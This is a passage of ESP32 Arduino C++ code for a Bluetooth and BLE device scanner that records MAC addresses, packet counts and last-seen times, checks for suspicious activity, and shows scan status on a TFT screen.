      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    pBLEScan->start(Config::bleScanDuration, false);
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, Config::btScanDuration, 0);
    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  sniffer.setup();
  sniffer.setSnifferInstance();
}

void blesnifferLoop() {
  sniffer.loop();
  } 
}
